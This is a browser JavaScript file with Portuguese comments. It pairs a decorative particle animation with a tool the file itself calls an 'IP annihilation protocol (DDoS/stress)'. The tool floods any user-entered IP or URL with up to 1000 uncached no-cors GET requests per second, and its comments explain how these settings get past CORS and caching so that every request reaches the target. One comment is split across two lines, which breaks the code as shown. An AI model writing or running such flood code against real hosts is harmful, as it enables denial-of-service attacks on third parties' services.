// --- Efeito de Partículas de Fundo (para o "animado") ---
const particleCanvas = document.getElementById('particle-canvas');
const ctx = particleCanvas.getContext('2d');
let particles = [];
const numParticles = 100; // Número de partículas

function resizeCanvas() {
    particleCanvas.width = window.innerWidth;
    particleCanvas.height = window.innerHeight;
}
window.addEventListener('resize', resizeCanvas);
resizeCanvas();

class Particle {
    constructor(x, y) {
        this.x = x;
        this.y = y;
        this.size = Math.random() * 2 + 1; // Tamanho entre 1 e 3
        this.speedX = Math.random() * 0.5 - 0.25; // Velocidade aleatória horizontal
        this.speedY = Math.random() * 0.5 - 0.25; // Velocidade aleatória vertical
        this.color = `rgba(${Math.floor(Math.random() * 50)}, 0, ${Math.floor(Math.random() * 100) + 150}, ${Math.random() * 0.5 + 0.2})`; // Cor roxa escura, translúcida
    }
    update() {
        this.x += this.speedX;
        this.y += this.speedY;

        if (this.size > 0.1) this.size -= 0.02; // Partículas diminuem
        // Reflete nas bordas
        if (this.x < 0 || this.x > particleCanvas.width) this.speedX *= -1;
        if (this.y < 0 || this.y > particleCanvas.height) this.speedY *= -1;
    }
    draw() {
        ctx.fillStyle = this.color;
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fill();
    }
}

function initParticles() {
    for (let i = 0; i < numParticles; i++) {
        particles.push(new Particle(Math.random() * particleCanvas.width, Math.random() * particleCanvas.height));
    }
}

function animateParticles() {
    ctx.clearRect(0, 0, particleCanvas.width, particleCanvas.height); // Limpa o canvas
    for (let i = 0; i < particles.length; i++) {
        particles[i].update();
        particles[i].draw();
        // Remove partículas muito pequenas e adiciona novas
        if (particles[i].size <= 0.1) {
            particles.splice(i, 1);
            particles.push(new Particle(Math.random() * particleCanvas.width, Math.random() * particleCanvas.height));
            i--;
        }
    }
    requestAnimationFrame(animateParticles); // Loop da animação
}

initParticles();
animateParticles();

// --- Protocolo de Aniquilação de IP (DDoS/Estresse) ---
let attackInterval = null; // Para controlar o intervalo de envio de requisições
let requestCounter = 0;    // Contador de requisições bem-sucedidas (ou sem erro de rede)
let failedCounter = 0;     // Contador de requisições que falharam na rede
let totalRequests = 0;     // Contador total de requisições enviadas
let attackRunning = false; // Flag para indicar se o ataque está ativo
let startTime = 0;         // Tempo de início do ataque

const targetIpInput = document.getElementById('targetIp');
const requestsPerSecondInput = document.getElementById('requestsPerSecond');
const  startAttackBtn = document.getElementById('startAttackBtn');
const stopAttackBtn = document.getElementById('stopAttackBtn');
const statusMessage = document.getElementById('statusMessage');

// Função para enviar uma única requisição ao alvo
async function sendRequest(target) {
    totalRequests++;
    try {
        // 'no-cors' permite enviar requisições para qualquer domínio, mas a resposta é opaca
        // Isso é crucial para evitar erros CORS no navegador ao atingir alvos externos
        await fetch(target, {
            method: 'GET', // Pode ser 'POST', 'HEAD', etc., dependendo do efeito desejado
            mode: 'no-cors',
            cache: 'no-store' // Impede o cache para garantir que cada requisição atinja o servidor
        });
        requestCounter++;
    } catch (error) {
        failedCounter++;
    } finally {
        updateStatus(); // Atualiza o status após cada requisição (sucesso ou falha)
    }
}

// Função para atualizar a mensagem de status
function updateStatus() {
    const elapsedSeconds = (Date.now() - startTime) / 1000;
    const avgRPS = elapsedSeconds > 0 ? (totalRequests) / elapsedSeconds : 0;
    statusMessage.innerHTML = `Status: Atacando <strong>${targetIpInput.value}</strong>.<br>
                               Requisições Enviadas: ${totalRequests} | Sucessos (Network OK): ${requestCounter} | Falhas (Network Error): ${failedCounter}<br>
                               RPS Médio: ${avgRPS.toFixed(2)}`;
}

// Função para iniciar o ataque
function startAttack() {
    const target = targetIpInput.value.trim();
    let rps = parseInt(requestsPerSecondInput.value, 10);

    if (!target) {
        statusMessage.textContent = 'Erro: Por favor, insira um Alvo IP/URL válido.';
        return;
    }
    if (isNaN(rps) || rps <= 0 || rps > 1000) {
        statusMessage.textContent = 'Erro: Requisições/Segundo deve ser um número entre 1 e 1000.';
        return;
    }

    // Garante que o alvo tenha um protocolo (http/https) para o 'fetch' funcionar corretamente
    const fullTarget = target.startsWith('http://') || target.startsWith('https://') ? target : `http://${target}`;

    // Desabilita os controles para evitar mudanças durante o ataque
    startAttackBtn.disabled = true;
    stopAttackBtn.disabled = false;
    targetIpInput.disabled = true;
    requestsPerSecondInput.disabled = true;

    // Reseta os contadores para um novo ataque
    requestCounter = 0;
    failedCounter = 0;
    totalRequests = 0;
    attackRunning = true;
    startTime = Date.now();

    const intervalMs = 1000 / rps; // Tempo em ms entre cada requisição

    // O ataque é iniciado por um loop que tenta enviar requisições no ritmo desejado.
    // Para RPS altos, o navegador pode ter limitações.
    // Este método usa um setInterval para disparar as requisições, simulando um fluxo contínuo.
    let requestsSentThisSecond = 0;
    let lastSecondCheck = Date.now();

    attackInterval = setInterval(() => {
        if (!attackRunning) {
            clearInterval(attackInterval);
            return;
        }

        const now = Date.now();
        if (now - lastSecondCheck >= 1000) { // Reset a cada segundo
            requestsSentThisSecond = 0;
            lastSecondCheck = now;
        }

        // Tenta enviar requisições até atingir o RPS ou o limite do navegador
        // Pode ser ajustado para enviar mais em cada "tick" para RPS mais altos
        if (requestsSentThisSecond < rps) {
            sendRequest(fullTarget);
            requestsSentThisSecond++;
        }
        updateStatus();
    }, Math.max(1, Math.floor(intervalMs))); // Garante que o intervalo seja pelo menos 1ms para não travar
    // Usamos Math.max(1, ...) para evitar intervalos de 0ms, que podem causar problemas de performance.
    // Para RPS altos, ele tentará disparar requests o mais rápido possível.

    statusMessage.textContent = `Atacando ${fullTarget}... Iniciando...`;
}

// Função para parar o ataque
function stopAttack() {
    clearInterval(attackInterval); // Para o envio
  de requisições
    attackRunning = false;
    // Habilita novamente os controles
    startAttackBtn.disabled = false;
    stopAttackBtn.disabled = true;
    targetIpInput.disabled = false;
    requestsPerSecondInput.disabled = false;
    statusMessage.textContent = `Ataque parado. Total de ${totalRequests} requisições enviadas.`;
}

// Adiciona os event listeners aos botões
startAttackBtn.addEventListener('click', startAttack);
stopAttackBtn.addEventListener('click', stopAttack);

// Estado inicial dos botões
stopAttackBtn.disabled = true;